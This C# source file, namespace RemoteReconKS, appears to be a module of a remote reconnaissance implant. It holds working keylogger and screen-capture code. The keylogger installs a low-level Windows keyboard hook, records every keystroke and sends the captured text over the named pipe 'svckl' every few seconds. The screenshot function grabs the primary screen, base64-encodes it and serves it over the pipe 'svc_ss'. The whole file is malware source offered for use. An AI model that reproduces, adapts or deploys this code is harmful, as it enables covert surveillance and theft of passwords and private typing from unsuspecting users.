using System;
using System.IO;
using System.IO.Pipes;
using System.Windows.Forms;
using System.Drawing;
using System.Drawing.Imaging;
using System.Threading;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace RemoteReconKS
{
    public class RemoteReconKS
    {

        private static NamedPipeServerStream server;
        private static StreamWriter sw;
        private static StringBuilder keylogoutput = new StringBuilder();

        public static void Execute(string capability)
        {
            if (capability.ToLower() == "screenshot")
            {
                server = new NamedPipeServerStream("svc_ss", PipeDirection.InOut, 1, PipeTransmissionMode.Message);
                server.WaitForConnection();
                sw = new StreamWriter(server);

                //byte[] image = screenshot();
                sw.WriteLine(screenshot());
                Thread.Sleep(5000);
                sw.Flush();

                server.Close();
            }
            else if(capability.ToLower() == "keylog")
            {
                StartKeylogger();
            }
        }

        private static string screenshot()
        {

            try
            {
                string encImage;
                var screenshotobject = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                var DrawingGraphics = Graphics.FromImage(screenshotobject);

                DrawingGraphics.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, screenshotobject.Size, CopyPixelOperation.SourceCopy);
                DrawingGraphics.Dispose();

                MemoryStream ms = new MemoryStream();
                screenshotobject.Save(ms, ImageFormat.Png);
                byte[] imgBytes = ms.ToArray();
                encImage = Convert.ToBase64String(imgBytes);
                return encImage;
            }
            catch (Exception e)
            {
                return e.ToString();
            }
        }

        private static void StartKeylogger()
        {
            //Start a background thread for the keylogger
            WinApi._hookID = SetHook(WinApi._proc);
            Thread t = new Thread(() =>
            {
                LogKeyStrokes();
            });
            t.SetApartmentState(ApartmentState.MTA);
            t.IsBackground = true;
            t.Start();
#if DEBUG
            File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", "Starting Application loop");
#endif
            try
            {
                Application.Run();
                WinApi.UnhookWindowsHookEx(WinApi._hookID);
            }
            catch (Exception e)
            {
#if DEBUG
                File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", e.ToString());
#endif
                
            }
            
        }

        
        private static void LogKeyStrokes()
        {
            NamedPipeClientStream client = new NamedPipeClientStream(".","svckl", PipeDirection.InOut);
            client.Connect(5000);
#if DEBUG
            File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", "Connected to server" + '\n');
#endif
            sw = new StreamWriter(client);
            while (client.IsConnected)
            {
                try
                {
#if DEBUG
                    File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", keylogoutput.ToString());
#endif
                    sw.WriteLine(keylogoutput.ToString());
                    keylogoutput.Remove(0, keylogoutput.Length);
                }
                catch (Exception e)
                {
#if DEBUG
                    File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", e.ToString() + "\n");
#endif
                }
                
                
                Thread.Sleep(3000);
                sw.Flush();
            }
#if DEBUG
            File.AppendAllText(@"C:\Users\dso\Desktop\kl.log", "\nClient disconnected\n");
#endif
            sw.Close();
            client.Close();
            client.Dispose();
        }

        private static IntPtr SetHook(WinApi.LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            {
                using (ProcessModule curModule = curProcess.MainModule)
                {
                    return WinApi.SetWindowsHookEx(WinApi.WH_KEYBOARD_LL, proc, WinApi.GetModuleHandle(curModule.ModuleName), 0);
                }
            }
        }

        public static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            byte[] keyboardState = new byte[256];
            //StringBuilder keylogoutput = new StringBuilder();
            IntPtr kblh = WinApi.GetKeyboardLayout(Process.GetCurrentProcess().Id);

            if (nCode >= 0 && (wParam == (IntPtr)WinApi.WM_KEYDOWN || wParam == (IntPtr)WinApi.WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);

                switch ((Keys)vkCode)
                {
                    case Keys.Space:
                        keylogoutput.Append(" ");
                        break;
                    case Keys.RControlKey:
                        keylogoutput.Append("[RCNTRL]");
                        break;
                    case Keys.LControlKey:
                        keylogoutput.Append("[LCNTRL]");
                        break;
                    case Keys.LWin:
                        keylogoutput.Append("[WIN]");
                        break;
                    case Keys.Tab:
                        keylogoutput.Append("[TAB]");
                        break;
                    case Keys.Back:
                        keylogoutput.Append("[BACKSPACE]");
                        break;
                    default:
                        break;
                }
                //Check if the shift modifier was used
                bool shiftMod = Convert.ToBoolean((int)WinApi.GetAsyncKeyState(Keys.ShiftKey) & 32768);
                var scancode = WinApi.MapVirtualKeyEx((uint)vkCode, 0x04, kblh);

                if (scancode > 0)
                {

                    if (shiftMod)
                    {
                        keyboardState[(int)Keys.ShiftKey] = 0x80;
                        keyboardState[(int)Keys.LShiftKey] = 0x80;
                        keyboardState[(int)Keys.RShiftKey] = 0x80;
                    }

                    var s = new StringBuilder(256);
                    var returnCode = WinApi.ToUnicodeEx((uint)vkCode, scancode, keyboardState, s, s.Capacity, 0, kblh);
                    keylogoutput.Append(s.ToString());
                }
                else
                {
                    var s = new StringBuilder(5);
                    var returnCode = WinApi.ToUnicodeEx((uint)vkCode, scancode, keyboardState, s, s.Capacity, 0, kblh);
                }
            }

            return WinApi.CallNextHookEx(WinApi._hookID, nCode, wParam, lParam);
        }

    }
}
